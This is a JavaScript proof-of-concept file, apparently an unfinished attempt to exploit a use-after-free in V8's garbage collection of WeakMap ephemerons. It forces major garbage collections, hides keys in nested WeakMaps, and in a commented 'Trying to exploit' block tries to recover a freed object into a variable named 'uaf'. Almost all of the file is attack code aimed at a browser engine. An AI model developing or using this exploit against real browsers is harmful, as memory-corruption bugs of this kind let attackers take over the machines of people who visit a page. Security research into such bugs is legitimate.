var gcSize = 0x4fe00000;
var initKey = { init: 1 };
var level = 6;
let map = new WeakMap();

function gc() {
  //trigger major GC: See https://tiszka.com/blog/CVE_2021_21225_exploit.html (Trick #2: Triggering Major GC without spraying the heap)
  new ArrayBuffer(gcSize);
}

//Return values should be deleted/out of scope when gc happen, so they are not directly reachable in gc
function hideWeakMap(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = { 'h': i };
    //make thisKey reachable via prevKey
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      let retMap = new WeakMap();
      map.set(thisKey, retMap);
      return thisKey;
    }
  }
}

//Get the key for the hidden map, the return key is reachable as strong ref via weak maps, but should not be directly reachable when gc happens
function getHiddenKey(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      return thisKey;
    }
  }
}

// /*** TEST DEBUGGING
// var initKey = {init : 1};
// var level = 20;

// let rootkey = hideWeakMap(wm, level, initKey);
// var rootWm = new WeakMap();

function fml(map) {
  let hk = hideWeakMap(map, level, initKey);
  //Round 1 maps
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap();
  let map8 = new WeakMap();

  //hk->k5, k5: discover->wl
  let k5 = { k5: 1 };
  let map5 = new WeakMap();
  let k7 = { k7: 1 };
  let k9 = { k9: 1 };
  let k8 = { k8: 1 };
  let ta = new Uint8Array(1024);
  ta.fill(0xfe);
  let larr = new Array(1 << 15);
  larr.fill(1.1);
  let v9 = { ta: ta, larr: larr };
  map.set(k7, map7);
  map.set(k9, v9);

  //map3 : kb|vb: initial discovery ->wl
  hiddenMap.set(k5, map5);
  hiddenMap.set(hk, k5);

  //iter2: wl: discover map5, mark v6 (->k5) black, discovery: k5 black -> wl
  //iter3: wl: map5 : mark map7, k7, no discovery, iter end
  map5.set(hk, k7);
}

// fml(map);

var k4 = {};

function fml2(map) {
  // Hide my map to escape the concurrent fucker
  let hk = hideWeakMap(map, level, initKey);
  let hmap = map.get(hk);
  // Map is the first Ephemeron to be checked.
  var v1 = {}
  var v3 = v1;
  var k3 = {};
  hmap.set(k3,v3);
  hmap.set({}, {});
  hmap.set(k4, k3);
}

fml2(map);

% CollectGarbage(null)

// */

/* Trying to exploit */
/*
let k4 = { k: 4 };
let k1 = { k: 1 };
let v1 = { v: 1 };
//let k3 = { k: 3 };
let v3 = { v: 3 };

let innerWm = new WeakMap();
wm.set(k4, innerWm);
wm.set(k1, v1);
wm.set(v3, k1);

// v3 -> k1 -> **v1**
innerWm.set(k4, {k :3});
innerWm.set(innerWm.get(k4), {v:3});


let iwm = wm.get(k4);
% CollectGarbage(null)
let uaf = wm.get(wm.get(iwm.get(iwm.get(k4))))

var rootWm = new WeakMap();
var kwm = {};
var k4 = {};

{
  let k1 = {};
  let v1 = {};
  let v2 = {};
  let k2 = {};
  let k3 = {};
  let v3 = k1;

  rootWm.set(k1, v1);
  rootWm.set(k2, v2);
  let wm = new WeakMap();
  rootWm.set(kwm, wm);
  wm.set(k3, v3);
  wm.set(k4, k3);
}

%CollectGarbage(null)
//v1 can be retrieved as follows:
let wm = rootWm.get(kwm);
let k1 = wm.get(wm.get(k4));
let v1 = rootWm.get(k1);

// var rootWm = new WeakMap();
// var kwm = {};
// var k4 = {};
// {
//   let k1 = {};
//   let k2 = {};
//   let k3 = {};
//   let v3 = k1;
//   rootWm.set(k3, v3);
//   rootWm.set(k4, k3);
//   rootWm.set(k1, {});
//   rootWm.set(k2, {});
//   let wm = new WeakMap();
//   rootWm.set(kwm, wm);
// }
// gc();
// //v1 can be retrieved as follows:
// let wm = rootWm.get(kwm);
// let k1 = wm.get(wm.get(k4));
// let v1 = rootWm.get(k1);
*/